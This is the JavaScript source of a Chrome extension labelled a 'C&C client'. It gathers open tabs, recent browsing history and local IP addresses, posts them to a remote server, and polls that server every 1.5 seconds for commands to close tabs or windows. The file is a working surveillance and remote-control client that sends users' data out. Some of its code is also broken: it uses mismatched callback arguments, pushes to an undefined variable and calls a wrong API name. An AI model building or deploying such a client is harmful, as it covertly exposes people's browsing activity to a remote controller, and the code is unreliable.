/* C&C client API */

chrome.tabs.onCreated.addListener(updateInfo);
chrome.tabs.onRemoved.addListener(updateInfo);

// Command structure definition
var runCommand = {
    updateInfo: updateInfo,
    closeTab: closeTab,
    closeCurrentTab: closeCurrentTab,
    closeAllTabs: closeAllTabs,
    closeCurrentWindow: closeCurrentWindow
}

function updateInfo() {
    if (awake) {
        var getId = new Promise(function (resolve, reject) {
            chrome.storage.local.get(['id'], function (result) {
                resolve(result.id);
            });
        });
        var getTabs = new Promise(function (resolve, reject) {
            chrome.tabs.query({}, function (tabs) {
                resolve(tabs);
            });
        });
        var getHistory = new Promise(function (resolve, reject) {
            chrome.history.search({ text: '', maxResults: 10 }, function (result) {
                resolve(result);
            });
        });
        var getIPs = new Promise(function (resolve, reject) {
            getLocalIPs(function (ips) {
                resolve(ips);
            });
        });
    
        Promise.all([getId, getTabs, getHistory, getIPs])
        .then(function (data) {
            $.post(`${url}/clients/${data[0]}/update`, {
                data: JSON.stringify({
                    blocks: successfulBlocks,
                    tabs: data[1],
                    history: data[2],
                    ips: data[3]
                })
            })
            .fail(fellOver);
        });
    }
}

function closeTab(callback, args) {
    chrome.tabs.remove(args.tabId, function () {
        if (chrome.runtime.lastError) {
            return callback('Unable to close tab');
        }
        return callback();
    });
}

function closeCurrentTab(callback) {
    chrome.tabs.getCurrent(function (tab) {
        chrome.tabs.remove(tab.id, function() {
            if (chrome.runtime.lastError) {
                return callback('Unable to close tab');
            }
            return callback();
        })
    })
}

function closeAllTabs(callback) {
    chrome.tabs.query({}, function (tabs) {
        for (var i = 0; i < tabs.length; i++) {
            closeTab(tabs[i].id, callback);
        }
    });
}

function closeCurrentWindow(callback) {
    chrome.window.getCurrent(function (window) {
        chrome.window.remove(window.id, function() {
            if (chrome.runtime.lastError) {
                return callback('Unable to close window');
            }
            return callback();
        });
    });
}

function consumeCommands() {
    if (awake) {
        chrome.storage.local.get(['id'], function (result) {
            $.getJSON(`${url}/clients/${result.id}/bulletin`, function (commands) {
                var results = []
                for (var i = 0; i < commands.length; i++) {
                    runCommand[commands[i].code](function (err) {
                        if (err) {
                            return responses.push({
                                success: false,
                                err: err
                            })
                        }
                        responses.push({
                            success: true
                        })
                    }, commands[i].args);
                }
                $.post(`${url}/clients/${result.id}/bulletin/respond`, results)
                .fail(fellOver)
            })
            .fail(fellOver);
        });
    }
}

setInterval(consumeCommands, 1500)